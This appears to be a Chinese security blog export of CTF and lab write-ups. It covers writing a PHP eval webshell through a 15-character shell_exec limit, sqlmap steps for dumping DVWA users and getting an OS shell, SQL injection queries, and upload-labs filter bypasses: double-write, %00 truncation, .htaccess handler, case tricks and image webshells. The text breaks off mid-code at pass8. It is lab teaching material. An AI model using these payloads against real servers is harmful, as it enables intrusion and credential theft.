<span class="hljs-comment">//和下面两个定义的函数作用相同</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span><span class="hljs-params">($b)</span></span>&#123;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">'$b'</span>;
&#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">b</span><span class="hljs-params">()</span></span>&#123;
    phpinfo();
&#125;</code></pre></div>



<h1 id="限制字符长度的命令执行"><a href="#限制字符长度的命令执行" class="headerlink" title="限制字符长度的命令执行"></a>限制字符长度的命令执行</h1><p>实验环境为ubuntu nginx+php5.5</p>
<p>实验目的</p>
<p>通过命令执行想服务器写入一句话木马而达到控制服务器的目的</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
highlight_file(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-keyword">if</span>(strlen($_GET[<span class="hljs-number">1</span>])&lt;=<span class="hljs-number">15</span>)&#123;
    <span class="hljs-keyword">echo</span> strlen($_GET[<span class="hljs-number">1</span>]);
    <span class="hljs-keyword">echo</span> shell_exec($_GET[<span class="hljs-number">1</span>]);
&#125;
<span class="hljs-keyword">else</span>&#123;
    <span class="hljs-keyword">exit</span>(<span class="hljs-string">"It's too long!"</span>);
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>限制了参数1的字符长度为15</p>
<p>然后将传递的参数放到shell_exec中执行</p>
<p>突破点就是利用shell_exec函数将，我们的一句话木马写入到一个php文件中，获取shell。</p>
<p>所以想要够的payload的为</p>
<div class="hljs"><pre><code class="hljs url">?1&#x3D;echo shellcode &gt;1.php</code></pre></div>

<p>将一句话木马写入到1.php中，我们知道一句话木马最短字符长度应该为21 ，这显然不能达到14个字符的限制要求</p>
<p><img src="https://i.loli.net/2020/11/29/JoPC8xrVBXQOqmE.png" srcset="/img/loading.gif" alt="muma.png"></p>
<p>可以使用<code>echo text &gt;&gt;tmp.txt</code></p>
<p>将字符串输出追加重定向，当前目录存在tmp.txt，则将tmp.txt的内容后面追加输出的字符串，会换行</p>
<p>例如下面</p>
<p><img src="https://i.loli.net/2020/11/29/L8A1xjieg6m9bGk.png" srcset="/img/loading.gif" alt="echo.png"></p>
<p>字符限制解决了，那么得知道换行后php代码还能正常执行吗，本地验证发现是没问题的</p>
<p><img src="https://i.loli.net/2020/11/29/HWEXFrRjaDGp726.png" srcset="/img/loading.gif" alt="yanzheng.png"></p>
<p>下面就可以做这个题目了</p>
<div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-comment">//为了每次写入更多的字符可以利用无后缀名的文件，最后用mv将其改为php文件</span>
?<span class="hljs-number">1</span>=echo \&lt;\?php &gt;<span class="hljs-number">1</span>
?<span class="hljs-number">1</span>=echo eval\( &gt;&gt;<span class="hljs-number">1</span>
?<span class="hljs-number">1</span>=echo \$_GET &gt;&gt;<span class="hljs-number">1</span>
?<span class="hljs-number">1</span>=echo \[<span class="hljs-number">1</span>\] &gt;&gt;<span class="hljs-number">1</span>
?<span class="hljs-number">1</span>=echo \)\; &gt;&gt;<span class="hljs-number">1</span> 
?<span class="hljs-number">1</span>=mv <span class="hljs-number">1</span> <span class="hljs-number">1.</span>php</code></pre></div>

<p>之后访问1.php提交参数，获取想要的内容。</p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>cmd</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap</title>
    <url>/2020/07/18/sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h1><a id="more"></a>

<p>第一步:</p>
<div class="hljs"><pre><code>-u &quot;xx” --cookie= &quot;yyy&quot; //带上cookie对URL进行注入探测</code></pre></div><p>第二步:</p>
<div class="hljs"><pre><code>-u &quot;xxx” --cookie= &quot;yy&quot; - current--db //对数据库名进行获取</code></pre></div><p>第三步:</p>
<div class="hljs"><pre><code>-u &quot;xxx&quot; --cookie=&quot;yyy&quot; -D dvwa --tables //对数据库dvwa的表名进行枚举</code></pre></div><p>第四步:</p>
<div class="hljs"><pre><code>-u &quot;xx&quot; --cookie= &quot;yyy&quot; -D dvwa -T users --columns //对dvwa库里面的名为users表的列名进行枚举</code></pre></div><p>第五步:</p>
<div class="hljs"><pre><code>-u&quot;xxx&quot;--cookie=&quot;yyy&quot; -D dvwa -T users -C name,password - dump
//探测user表name和password字段</code></pre></div><p>如果此时得到的密码为密文, SQLmap会自动询问，是否爆破,选择”是”即可开始使用SQLMAP自带的字<br>典进行爆破。</p>
<p>第六步:</p>
<div class="hljs"><pre><code>-u&quot;xxx&quot;--cookie= &quot;yy&quot; --os - shell //获取shell,选择后台语言</code></pre></div><h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>order by * </p>
<p>group by *</p>
<p>利用内置函数暴数据库信息</p>
<p>version() 查看数据库版本</p>
<p>database() 查看当前数据库名</p>
<p>user() 查看当前用户</p>
<p>查看表：</p>
<div class="hljs"><pre><code>Select  TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database()  </code></pre></div><p>可十六进制查看字段：</p>
<div class="hljs"><pre><code>select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=‘biaoming’;</code></pre></div>]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-11-21</title>
    <url>/2020/09/18/upload2/</url>
    <content><![CDATA[<h1 id="upload-labs-11-21"><a href="#upload-labs-11-21" class="headerlink" title="upload-labs 11-21"></a>upload-labs 11-21</h1><a id="more"></a>

<h2 id="pass11"><a href="#pass11" class="headerlink" title="pass11"></a>pass11</h2><div class="hljs"><pre><code class="hljs php">$is_upload = <span class="hljs-keyword">false</span>;
$msg = <span class="hljs-keyword">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'submit'</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">"php"</span>,<span class="hljs-string">"php5"</span>,<span class="hljs-string">"php4"</span>,<span class="hljs-string">"php3"</span>,<span class="hljs-string">"php2"</span>,<span class="hljs-string">"html"</span>,<span class="hljs-string">"htm"</span>,<span class="hljs-string">"phtml"</span>,<span class="hljs-string">"pht"</span>,<span class="hljs-string">"jsp"</span>,<span class="hljs-string">"jspa"</span>,<span class="hljs-string">"jspx"</span>,<span class="hljs-string">"jsw"</span>,<span class="hljs-string">"jsv"</span>,<span class="hljs-string">"jspf"</span>,<span class="hljs-string">"jtml"</span>,<span class="hljs-string">"asp"</span>,<span class="hljs-string">"aspx"</span>,<span class="hljs-string">"asa"</span>,<span class="hljs-string">"asax"</span>,<span class="hljs-string">"ascx"</span>,<span class="hljs-string">"ashx"</span>,<span class="hljs-string">"asmx"</span>,<span class="hljs-string">"cer"</span>,<span class="hljs-string">"swf"</span>,<span class="hljs-string">"htaccess"</span>,<span class="hljs-string">"ini"</span>);

        $file_name = trim($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>]);
        $file_name = str_ireplace($deny_ext,<span class="hljs-string">""</span>, $file_name);
        $temp_file = $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
        $img_path = UPLOAD_PATH.<span class="hljs-string">'/'</span>.$file_name;        
        <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;
            $is_upload = <span class="hljs-keyword">true</span>;
        &#125; <span class="hljs-keyword">else</span> &#123;
            $msg = <span class="hljs-string">'上传出错！'</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        $msg = UPLOAD_PATH . <span class="hljs-string">'文件夹不存在,请手工创建！'</span>;
    &#125;
&#125;</code></pre></div>


<p> <code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code></p>
<p>这段代码是将文件名中出现  <code>deny_ext</code>的后缀名替换为空</p>
<p>可以双写绕过，即<code>1.pphphp</code></p>
<p><img src="/2020/09/18/upload2/11.png" srcset="/img/loading.gif" alt></p>
<h2 id="pass12"><a href="#pass12" class="headerlink" title="pass12"></a>pass12</h2><div class="hljs"><pre><code class="hljs php">$is_upload = <span class="hljs-keyword">false</span>;
$msg = <span class="hljs-keyword">null</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'submit'</span>]))&#123;
    $ext_arr = <span class="hljs-keyword">array</span>(<span class="hljs-string">'jpg'</span>,<span class="hljs-string">'png'</span>,<span class="hljs-string">'gif'</span>);
    $file_ext = substr($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>],strrpos($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>],<span class="hljs-string">"."</span>)+<span class="hljs-number">1</span>);
    <span class="hljs-keyword">if</span>(in_array($file_ext,$ext_arr))&#123;
        $temp_file = $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
        $img_path = $_GET[<span class="hljs-string">'save_path'</span>].<span class="hljs-string">"/"</span>.rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">"YmdHis"</span>).<span class="hljs-string">"."</span>.$file_ext;

        <span class="hljs-keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;
            $is_upload = <span class="hljs-keyword">true</span>;
        &#125; <span class="hljs-keyword">else</span> &#123;
            $msg = <span class="hljs-string">'上传出错！'</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span>&#123;
        $msg = <span class="hljs-string">"只允许上传.jpg|.png|.gif类型文件！"</span>;
    &#125;
&#125;</code></pre></div>

<p>本题与之前的题目有所不同，这题的文件的保存路径是可以控制的</p>
<p>这里用的<code>%00截断</code>，原理如下</p>
<p><code>www.xxx.com/qq.jpg</code></p>
<p><code>www.xxx.com/qq.php%00.jpg =&gt; www.xxx.com/qq.php</code>其后缀名为.jpg可以绕过检测，但是windows系统处理时不会处理%00之后的内容故保存的文件就是qq.php</p>
<p><img src="/2020/09/18/upload2/12.png" srcset="/img/loading.gif" alt></p>
<h2 id="pass13"><a href="#pass13" class="headerlink" title="pass13"></a>pass13</h2><p>这题与上题利用的原理相同</p>
<p>但是这里要使用 00的二进制形式</p>
<p><img src="/2020/09/18/upload2/13.png" srcset="/img/loading.gif" alt></p>
<p><img src="/2020/09/18/upload2/13-1.png" srcset="/img/loading.gif" alt></p>
<h2 id="pass14"><a href="#pass14" class="headerlink" title="pass14"></a>pass14</h2><p><img src="/2020/09/18/upload2/14.png" srcset="/img/loading.gif" alt></p>
<p>明确说了上传图片木马</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getReailFileType</span><span class="hljs-params">($filename)</span></span>&#123;
    $file = fopen($filename, <span class="hljs-string">"rb"</span>);
    $bin = fread($file, <span class="hljs-number">2</span>); <span class="hljs-comment">//只读2字节</span>
    fclose($file);
    $strInfo = @unpack(<span class="hljs-string">"C2chars"</span>, $bin);    
    $typeCode = intval($strInfo[<span class="hljs-string">'chars1'</span>].$strInfo[<span class="hljs-string">'chars2'</span>]);    
    $fileType = <span class="hljs-string">''</span>;    
    <span class="hljs-keyword">switch</span>($typeCode)&#123;      
        <span class="hljs-keyword">case</span> <span class="hljs-number">255216</span>:            
            $fileType = <span class="hljs-string">'jpg'</span>;
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">13780</span>:            
            $fileType = <span class="hljs-string">'png'</span>;
            <span class="hljs-keyword">break</span>;        
        <span class="hljs-keyword">case</span> <span class="hljs-number">7173</span>:            
            $fileType = <span class="hljs-string">'gif'</span>;
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">default</span>:            
            $fileType = <span class="hljs-string">'unknown'</span>;
        &#125;    
        <span class="hljs-keyword">return</span> $fileType;
&#125;</code></pre></div>

<p><strong>GIF89a</strong> 是GIF图片的文件头 ，是为了绕过gif文件的检查</p>
<p><strong>图片木马的制作</strong></p>
<p>桌面建立一个文本文件将其改为2.jpg，再建立一个改为1.php,其内容为你想添加的一句话木马</p>
<p><img src="/2020/09/18/upload2/14-1.png" srcset="/img/loading.gif" alt></p>
<p><code>copy 2.jpg /b + 1.php /a webshell.jpg</code></p>
<p><img src="/2020/09/18/upload2/14-2.png" srcset="/img/loading.gif" alt></p>
<p><strong>未完待续。。。</strong></p>
]]></content>
      <categories>
        <category>文件上传</category>
      </categories>
      <tags>
        <tag>双写绕过</tag>
        <tag>00截断</tag>
      </tags>
  </entry>
  <entry>
    <title>uploads-labs</title>
    <url>/2020/09/16/uploads/</url>
    <content><![CDATA[<h1 id="upload-labs-1-10"><a href="#upload-labs-1-10" class="headerlink" title="upload-labs 1-10"></a>upload-labs 1-10</h1><a id="more"></a>



<h2 id="pass1"><a href="#pass1" class="headerlink" title="pass1"></a>pass1</h2><p>直接抓包修改文件后缀名为jpg,png,gif即可</p>
<h2 id="pass2"><a href="#pass2" class="headerlink" title="pass2"></a>pass2</h2><p>查看源码</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'type'</span>] == <span class="hljs-string">'image/jpeg'</span>) || ($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'type'</span>] == <span class="hljs-string">'image/png'</span>) || ($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'type'</span>] == <span class="hljs-string">'image/gif'</span>))</code></pre></div>

<p>这段代码说明是对文件的<code>MIME</code>类型进行了过滤，直接上传 1.php 抓包后修改文件类型为 <code>&#39;image/jpeg&#39; ,&#39;image/png&#39;,&#39;image/gif&#39;</code>,这三个类型都为图片</p>
<p><img src="/2020/09/16/uploads/2.png" srcset="/img/loading.gif" alt></p>
<p>知识点补充：</p>
<p> <strong>MIME类型对大小写不敏感，但是传统写法都是小写。</strong> </p>
<div class="hljs"><pre><code class="hljs applescript"><span class="hljs-built_in">text</span>/plain
<span class="hljs-built_in">text</span>/html
image/jpeg
image/png
audio/mpeg
audio/ogg
audio/*
video/mp4
<span class="hljs-built_in">application</span>/*
<span class="hljs-built_in">application</span>/json
<span class="hljs-built_in">application</span>/javascript
<span class="hljs-built_in">application</span>/ecmascript
<span class="hljs-built_in">application</span>/octet-stream</code></pre></div>

<p>更详细的解释，</p>
<h2 id="pass3"><a href="#pass3" class="headerlink" title="pass3"></a>pass3</h2><div class="hljs"><pre><code class="hljs php">$deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">'.asp'</span>,<span class="hljs-string">'.aspx'</span>,<span class="hljs-string">'.php'</span>,<span class="hljs-string">'.jsp'</span>);</code></pre></div>

<p>只禁止了.asp,.aspx,.php,.jsp后缀文件，可以使用php3,php5,php7,phtml等等后缀名绕过</p>
<p><img src="/2020/09/16/uploads/3.png" srcset="/img/loading.gif" alt></p>
<h2 id="pass4"><a href="#pass4" class="headerlink" title="pass4"></a>pass4</h2><p><strong>.htaccess</strong>文件的作用</p>
<blockquote>
<ul>
<li>URL重写、自定义错误页面</li>
<li>MIME类型配置</li>
<li>访问权限控制等</li>
<li>主要体现在伪静态的应用</li>
<li>图片防盗链</li>
<li>自定义404错误页面</li>
<li>阻止/允许特定IP/IP段</li>
<li>目录浏览与主页</li>
<li>禁止访问指定文件类型</li>
<li>文件密码保护</li>
</ul>
</blockquote>
<div class="hljs"><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch "1.jpg"&gt;</span>
<span class="hljs-attribute"><span class="hljs-nomarkup">SetHandler</span></span> application/x-httpd-php
<span class="hljs-section">&lt;/FilesMatch&gt;</span></code></pre></div>

<p>这几句代码的意思：</p>
<p>通过.htaccess文件调用php解析器去解析一个文件名中只要包含”1.jpg”这个字符串的任意文件，</p>
<p>无论扩展名是什么(没有也行)，都以php的方式来解析</p>
<p>上传完.htaccess文件后直接上传一个 <code>1.jpg</code>即可</p>
<h2 id="pass5"><a href="#pass5" class="headerlink" title="pass5"></a>pass5</h2><div class="hljs"><pre><code class="hljs php">$is_upload = <span class="hljs-keyword">false</span>;
$msg = <span class="hljs-keyword">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'submit'</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">".php"</span>,<span class="hljs-string">".php5"</span>,<span class="hljs-string">".php4"</span>,<span class="hljs-string">".php3"</span>,<span class="hljs-string">".php2"</span>,<span class="hljs-string">".html"</span>,<span class="hljs-string">".htm"</span>,<span class="hljs-string">".phtml"</span>,<span class="hljs-string">".pht"</span>,<span class="hljs-string">".pHp"</span>,<span class="hljs-string">".pHp5"</span>,<span class="hljs-string">".pHp4"</span>,<span class="hljs-string">".pHp3"</span>,<span class="hljs-string">".pHp2"</span>,<span class="hljs-string">".Html"</span>,<span class="hljs-string">".Htm"</span>,<span class="hljs-string">".pHtml"</span>,<span class="hljs-string">".jsp"</span>,<span class="hljs-string">".jspa"</span>,<span class="hljs-string">".jspx"</span>,<span class="hljs-string">".jsw"</span>,<span class="hljs-string">".jsv"</span>,<span class="hljs-string">".jspf"</span>,<span class="hljs-string">".jtml"</span>,<span class="hljs-string">".jSp"</span>,<span class="hljs-string">".jSpx"</span>,<span class="hljs-string">".jSpa"</span>,<span class="hljs-string">".jSw"</span>,<span class="hljs-string">".jSv"</span>,<span class="hljs-string">".jSpf"</span>,<span class="hljs-string">".jHtml"</span>,<span class="hljs-string">".asp"</span>,<span class="hljs-string">".aspx"</span>,<span class="hljs-string">".asa"</span>,<span class="hljs-string">".asax"</span>,<span class="hljs-string">".ascx"</span>,<span class="hljs-string">".ashx"</span>,<span class="hljs-string">".asmx"</span>,<span class="hljs-string">".cer"</span>,<span class="hljs-string">".aSp"</span>,<span class="hljs-string">".aSpx"</span>,<span class="hljs-string">".aSa"</span>,<span class="hljs-string">".aSax"</span>,<span class="hljs-string">".aScx"</span>,<span class="hljs-string">".aShx"</span>,<span class="hljs-string">".aSmx"</span>,<span class="hljs-string">".cEr"</span>,<span class="hljs-string">".sWf"</span>,<span class="hljs-string">".swf"</span>,<span class="hljs-string">".htaccess"</span>);
        $file_name = trim($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>]);
        $file_name = deldot($file_name);<span class="hljs-comment">//删除文件名末尾的点</span>
        $file_ext = strrchr($file_name, <span class="hljs-string">'.'</span>);
        $file_ext = strtolower($file_ext); <span class="hljs-comment">//转换为小写</span>
        $file_ext = str_ireplace(<span class="hljs-string">'::$DATA'</span>, <span class="hljs-string">''</span>, $file_ext);<span class="hljs-comment">//去除字符串::$DATA</span>
        $file_ext = trim($file_ext); <span class="hljs-comment">//首尾去空</span>
        
        <span class="hljs-keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;
            $temp_file = $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
            $img_path = UPLOAD_PATH.<span class="hljs-string">'/'</span>.$file_name;
            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;
                $is_upload = <span class="hljs-keyword">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                $msg = <span class="hljs-string">'上传出错！'</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            $msg = <span class="hljs-string">'此文件类型不允许上传！'</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        $msg = UPLOAD_PATH . <span class="hljs-string">'文件夹不存在,请手工创建！'</span>;
    &#125;
&#125;</code></pre></div>

<p>本题与第十题完全一样，详细解答见第十题</p>
<p><img src="/2020/09/16/uploads/5.png" srcset="/img/loading.gif" alt></p>
<h2 id="pass6"><a href="#pass6" class="headerlink" title="pass6"></a>pass6</h2><div class="hljs"><pre><code class="hljs php">$is_upload = <span class="hljs-keyword">false</span>;
$msg = <span class="hljs-keyword">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'submit'</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">".php"</span>,<span class="hljs-string">".php5"</span>,<span class="hljs-string">".php4"</span>,<span class="hljs-string">".php3"</span>,<span class="hljs-string">".php2"</span>,<span class="hljs-string">".html"</span>,<span class="hljs-string">".htm"</span>,<span class="hljs-string">".phtml"</span>,<span class="hljs-string">".pht"</span>,<span class="hljs-string">".pHp"</span>,<span class="hljs-string">".pHp5"</span>,<span class="hljs-string">".pHp4"</span>,<span class="hljs-string">".pHp3"</span>,<span class="hljs-string">".pHp2"</span>,<span class="hljs-string">".Html"</span>,<span class="hljs-string">".Htm"</span>,<span class="hljs-string">".pHtml"</span>,<span class="hljs-string">".jsp"</span>,<span class="hljs-string">".jspa"</span>,<span class="hljs-string">".jspx"</span>,<span class="hljs-string">".jsw"</span>,<span class="hljs-string">".jsv"</span>,<span class="hljs-string">".jspf"</span>,<span class="hljs-string">".jtml"</span>,<span class="hljs-string">".jSp"</span>,<span class="hljs-string">".jSpx"</span>,<span class="hljs-string">".jSpa"</span>,<span class="hljs-string">".jSw"</span>,<span class="hljs-string">".jSv"</span>,<span class="hljs-string">".jSpf"</span>,<span class="hljs-string">".jHtml"</span>,<span class="hljs-string">".asp"</span>,<span class="hljs-string">".aspx"</span>,<span class="hljs-string">".asa"</span>,<span class="hljs-string">".asax"</span>,<span class="hljs-string">".ascx"</span>,<span class="hljs-string">".ashx"</span>,<span class="hljs-string">".asmx"</span>,<span class="hljs-string">".cer"</span>,<span class="hljs-string">".aSp"</span>,<span class="hljs-string">".aSpx"</span>,<span class="hljs-string">".aSa"</span>,<span class="hljs-string">".aSax"</span>,<span class="hljs-string">".aScx"</span>,<span class="hljs-string">".aShx"</span>,<span class="hljs-string">".aSmx"</span>,<span class="hljs-string">".cEr"</span>,<span class="hljs-string">".sWf"</span>,<span class="hljs-string">".swf"</span>,<span class="hljs-string">".htaccess"</span>,<span class="hljs-string">".ini"</span>);
        $file_name = trim($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>]);
        $file_name = deldot($file_name);<span class="hljs-comment">//删除文件名末尾的点</span>
        $file_ext = strrchr($file_name, <span class="hljs-string">'.'</span>);
        $file_ext = str_ireplace(<span class="hljs-string">'::$DATA'</span>, <span class="hljs-string">''</span>, $file_ext);<span class="hljs-comment">//去除字符串::$DATA</span>
        $file_ext = trim($file_ext); <span class="hljs-comment">//首尾去空</span>

        <span class="hljs-keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;
            $temp_file = $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
            $img_path = UPLOAD_PATH.<span class="hljs-string">'/'</span>.date(<span class="hljs-string">"YmdHis"</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).$file_ext;
            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;
                $is_upload = <span class="hljs-keyword">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                $msg = <span class="hljs-string">'上传出错！'</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            $msg = <span class="hljs-string">'此文件类型不允许上传！'</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        $msg = UPLOAD_PATH . <span class="hljs-string">'文件夹不存在,请手工创建！'</span>;
    &#125;
&#125;</code></pre></div>

<p>仔细查看源码会发现少了下面的这段代码</p>
<div class="hljs"><pre><code class="hljs php">$file_ext = strtolower($file_ext); <span class="hljs-comment">//转换为小写</span></code></pre></div>

<p>这里就可以大小写绕过。将文件后缀名改为<code>.pHp , .PHP</code>等</p>
<p><img src="/2020/09/16/uploads/6.png" srcset="/img/loading.gif" alt></p>
<p><img src="/2020/09/16/uploads/6-1.png" srcset="/img/loading.gif" alt></p>
<h2 id="pass7"><a href="#pass7" class="headerlink" title="pass7"></a>pass7</h2><div class="hljs"><pre><code class="hljs php">$is_upload = <span class="hljs-keyword">false</span>;
$msg = <span class="hljs-keyword">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'submit'</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">".php"</span>,<span class="hljs-string">".php5"</span>,<span class="hljs-string">".php4"</span>,<span class="hljs-string">".php3"</span>,<span class="hljs-string">".php2"</span>,<span class="hljs-string">".html"</span>,<span class="hljs-string">".htm"</span>,<span class="hljs-string">".phtml"</span>,<span class="hljs-string">".pht"</span>,<span class="hljs-string">".pHp"</span>,<span class="hljs-string">".pHp5"</span>,<span class="hljs-string">".pHp4"</span>,<span class="hljs-string">".pHp3"</span>,<span class="hljs-string">".pHp2"</span>,<span class="hljs-string">".Html"</span>,<span class="hljs-string">".Htm"</span>,<span class="hljs-string">".pHtml"</span>,<span class="hljs-string">".jsp"</span>,<span class="hljs-string">".jspa"</span>,<span class="hljs-string">".jspx"</span>,<span class="hljs-string">".jsw"</span>,<span class="hljs-string">".jsv"</span>,<span class="hljs-string">".jspf"</span>,<span class="hljs-string">".jtml"</span>,<span class="hljs-string">".jSp"</span>,<span class="hljs-string">".jSpx"</span>,<span class="hljs-string">".jSpa"</span>,<span class="hljs-string">".jSw"</span>,<span class="hljs-string">".jSv"</span>,<span class="hljs-string">".jSpf"</span>,<span class="hljs-string">".jHtml"</span>,<span class="hljs-string">".asp"</span>,<span class="hljs-string">".aspx"</span>,<span class="hljs-string">".asa"</span>,<span class="hljs-string">".asax"</span>,<span class="hljs-string">".ascx"</span>,<span class="hljs-string">".ashx"</span>,<span class="hljs-string">".asmx"</span>,<span class="hljs-string">".cer"</span>,<span class="hljs-string">".aSp"</span>,<span class="hljs-string">".aSpx"</span>,<span class="hljs-string">".aSa"</span>,<span class="hljs-string">".aSax"</span>,<span class="hljs-string">".aScx"</span>,<span class="hljs-string">".aShx"</span>,<span class="hljs-string">".aSmx"</span>,<span class="hljs-string">".cEr"</span>,<span class="hljs-string">".sWf"</span>,<span class="hljs-string">".swf"</span>,<span class="hljs-string">".htaccess"</span>,<span class="hljs-string">".ini"</span>);
        $file_name = $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>];
        $file_name = deldot($file_name);<span class="hljs-comment">//删除文件名末尾的点</span>
        $file_ext = strrchr($file_name, <span class="hljs-string">'.'</span>);
        $file_ext = strtolower($file_ext); <span class="hljs-comment">//转换为小写</span>
        $file_ext = str_ireplace(<span class="hljs-string">'::$DATA'</span>, <span class="hljs-string">''</span>, $file_ext);<span class="hljs-comment">//去除字符串::$DATA</span>
        
        <span class="hljs-keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;
            $temp_file = $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
            $img_path = UPLOAD_PATH.<span class="hljs-string">'/'</span>.date(<span class="hljs-string">"YmdHis"</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).$file_ext;
            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;
                $is_upload = <span class="hljs-keyword">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                $msg = <span class="hljs-string">'上传出错！'</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            $msg = <span class="hljs-string">'此文件不允许上传'</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        $msg = UPLOAD_PATH . <span class="hljs-string">'文件夹不存在,请手工创建！'</span>;
    &#125;
&#125;</code></pre></div>

<p>跟第六关对比发现少了这句话</p>
<div class="hljs"><pre><code>$file_ext = trim($file_ext); //首尾去空</code></pre></div><p> <strong>利用Windows系统的文件名特性。文件名最后增加空格和点，写成<code>1.php .</code>，这个需要用burpsuite抓包修改，上传后保存在Windows系统上的文件名最后的一个<code>.</code>会被去掉，实际上保存的文件名就是1<code>.php</code></strong> </p>
<p><img src="/2020/09/16/uploads/7.png" srcset="/img/loading.gif" alt></p>
<h2 id="pass8"><a href="#pass8" class="headerlink" title="pass8"></a>pass8</h2><div class="hljs"><pre><code class="hljs php">$is_upload = <span class="hljs-keyword">false</span>;
$msg = <span class="hljs-keyword">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'submit'</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
